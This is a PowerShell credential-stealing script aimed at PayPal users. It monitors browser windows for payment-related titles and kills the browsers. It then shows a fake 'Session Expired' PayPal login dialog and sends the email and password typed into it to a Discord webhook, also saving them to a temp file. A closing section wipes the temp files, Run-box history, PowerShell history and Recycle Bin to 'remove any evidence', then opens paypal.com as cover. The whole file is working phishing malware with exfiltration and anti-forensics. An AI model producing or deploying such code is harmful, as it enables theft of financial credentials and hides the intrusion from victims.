# Define the partial title you want to monitor (e.g., "TikTok")
$targetTitles = @("powerful tools", "paypal", "digital wallet")

# Define a list of popular browser process names
$browserProcesses = @("chrome", "firefox", "msedge", "opera")

# Define the interval to check (in seconds)
$checkInterval = 15

# Outer loop to run continuously
while ($true) {
    # Loop until any condition is met
    $conditionMet = $false

    while (-not $conditionMet) {
        foreach ($browserName in $browserProcesses) {
            $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
            if ($currentBrowserProcesses) {
                foreach ($process in $currentBrowserProcesses) {
                    try {
                        $processTitle = $process.MainWindowTitle
                        Write-Host "$browserName - Window Title: $processTitle"
                        if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
                            Write-Host "Detected one of the specified titles in $browserName. Closing..."
                            Stop-Process -Id $process.Id -Force
                            $conditionMet = $true  # Set the flag to true when any condition is met
                            break 2  # Exit both inner and outer loops when any condition is met
                        }
                    } catch {
                        # Handle any exceptions that might occur (e.g., due to missing access permissions)
                    }
                }
            }
        }

        if ($conditionMet) {
            break  # Exit the outer loop when any condition is met
        }

        # Sleep for the specified interval (in seconds) before checking again
        Start-Sleep -Seconds $checkInterval
    }
}

# Continue with the rest of your script here
Write-Host "A condition is met. Continue with the rest of your code here."


function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $hookurl
    }
}

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase



$browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"

$browserProcesses | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue | ForEach-Object {
        $_.CloseMainWindow()
        if (!$_.HasExited) { $_.Kill() }
    }
}

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please re-authenticate your Paypal Account."
$msgTitle = "Session Expired"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

# Define the URL to the image hosted on GitHub
$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/paypal.png"

$XAML = @"
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Session Expired" Height="300" Width="300" WindowStartupLocation="CenterScreen">
    <Grid>
        <Image Source="$imageUrl" Stretch="Fill" />
        <Grid Background="Transparent">
            <Grid.RowDefinitions>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="20"/> <!-- Empty row with 20 units of height -->
            </Grid.RowDefinitions>
            <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>

            <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Email:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
            </StackPanel>

            <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
                <Label Content="Password:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
            </StackPanel>

            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
        </Grid>
    </Grid>
</Window>
"@

# Load the XAML and create a Window object
$loginWindow = [Windows.Markup.XamlReader]::Load([System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML))


# Create a XML reader for the XAML
$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)

# Load the XAML and create a Window object
$loginWindow = [Windows.Markup.XamlReader]::Load($reader)

# Define an event handler for the Login button
$loginButton = $loginWindow.FindName("LoginButton")
$loginButton.Add_Click({
    $enteredUsername = $loginWindow.FindName("Username").Text
    $enteredPassword = $loginWindow.FindName("Password").Password

    # Send the collected data to Discord
    $creds = "Paypal`nEmail: $enteredUsername`nPassword: $enteredPassword"
    Upload-Discord -text $creds

    # Save the data to a file
    $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
    $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8

    # Add your code for uploading the file to Dropbox here

    $loginWindow.Close()
    Write-Host "Data sent successfully!"
})

# Show the login window
$loginWindow.ShowDialog()

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

$URL = "https://www.paypal.com"

# Check if Google Chrome is installed
$ChromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"  # Update this path to match your Chrome installation path
$chromeInstalled = Test-Path $ChromePath

if ($chromeInstalled) {
    Start-Process $ChromePath $URL
} else {
    # If Chrome is not installed, use the default browser
    Start-Process $URL
}


exit
